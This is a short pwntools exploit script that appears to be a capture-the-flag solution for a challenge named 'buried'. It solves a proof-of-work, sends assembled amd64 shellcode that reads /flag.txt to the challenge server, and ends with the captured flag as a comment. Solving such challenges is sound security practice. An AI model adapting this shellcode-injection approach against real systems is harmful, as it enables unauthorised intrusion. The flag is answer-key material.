#!/usr/bin/env python
from pwn import *
import kctf

context.log_level = "CRITICAL"
context.arch = "amd64"
REMOTE = True

if REMOTE:
    HOST = "buried.chal.pwni.ng"
else:
    HOST = "localhost"

p = remote(HOST, 1337)

if REMOTE:
    p.recvuntil(b') solve')
    p.sendlineafter(b"Solution?", kctf.solve_challenge(p.recvline().strip().decode()).encode())
    p.recvline()

code = asm(f"""
push 0
mov rax, 0x12341235000
mov qword ptr [rax-8], 10
pop r10
cmp r10, 0
je yeet

exit:
    {shellcraft.cat('/flag.txt')}

yeet:
    mov rax, 2
    mov rdi, 0x1337
    je yeet
""")

p.sendline(code.hex().encode())
p.interactive()

# PCTF{tell_you_what. you_give_me_back_the_sock_and_ill_give_you...three wishes}
